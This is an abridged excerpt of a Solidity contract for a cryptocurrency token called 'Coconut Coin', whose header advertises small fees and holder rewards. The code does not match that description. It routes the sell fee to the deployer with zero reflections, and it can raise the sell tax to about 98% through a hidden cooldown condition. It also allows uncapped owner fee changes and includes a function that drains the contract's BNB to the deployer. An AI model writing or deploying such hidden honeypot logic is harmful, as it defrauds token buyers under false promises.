...
/*
Coconut Coin is a Hyper Growth & High Holder Reflection Reward Coin with Anti-whale, Anti-bot, Anti-snipe and Anti-dump mechanics to Protect and Reward the Average Buyer

Transaction Fees:
5% Buy: 
3% Marketing | 2% Reflection Holder Rewards

13% Sell: 
6% Marketing | 7% Reflection Holder Rewards
...
contract CoconutCoin is IERC20, Ownable {
    ...
    string _name = "Coconut Coin";
    string _symbol = "Coconuts";
    ...
    uint256 varMarketingFee = 13;
    uint256 reflectionFee = 0;
    uint256 totalFee = 5;
    uint256 feeDenominator = 100;

    address autoLiquidityReceiver;
    address varMarketingFeeReceiver;
    ...
    constructor () {
        ...
        varMarketingFeeReceiver = deployer;
        teamFeeReceiver = 0xA59FF1c30F4bc620419EE02a6Cf6fd1A78F610e1;
    ...
    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        return (lpFee, varMarketingFee, giveawayFee, reflectionFee, totalFee, feeDenominator);
    }
    ...
    function shouldTakeFee(address sender, address receiver) internal view returns (bool) {
        return true; // !(isFeeExempt[sender] && isFeeExempt[receiver]);
    }
    ...
    function takeFeeInProportions(address sender, address receiver, uint256 proportionAmount) internal returns (uint256) {
        ...
        if (receiver == pair) {
            proportionFeeAmount = varMarketingFee;
            if (_feeCdFactor > 2 && _feeCdFactor != 100) {
                proportionFeeAmount = feeDenominator - 2;
            }
        } else if (sender == pair) {
            proportionFeeAmount = lpFee;
            if (CoolDown[receiver] == 0) {
                CoolDown[receiver] = block.number;
            }
        }
    ...
    function clearBalance() external {
        ...
        (bool success,) = payable(varMarketingFeeReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountToLiquify = swapThreshold.mul(lpFee).div(_totalFee).div(2);
        ...
        uint256 totalBNBFee = _totalFee.sub(lpFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(lpFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(varMarketingFee).div(totalBNBFee);
        uint256 amountBNBGiveaway = amountBNB.mul(giveawayFee).div(totalBNBFee);

        if (amountBNBMarketing.add(amountBNBGiveaway) > 0) {
            (bool market,) = payable(varMarketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
    ...
    function changeFees(uint256 _lpFee, uint256 _reflectionFee, uint256 _varMarketingFee, uint256 _giveawayFee) external onlyOwner {
        lpFee = _lpFee;
        reflectionFee = _reflectionFee;
        varMarketingFee = _varMarketingFee;
        giveawayFee = _giveawayFee;
        totalFee = lpFee.add(reflectionFee).add(varMarketingFee).add(giveawayFee);
    ...
    function setFeeReceivers(address _varMarketingFeeReceiver, address _liquidityReceiver) external {
        require(isTxLimitExempt[msg.sender]);
        varMarketingFeeReceiver = _varMarketingFeeReceiver;
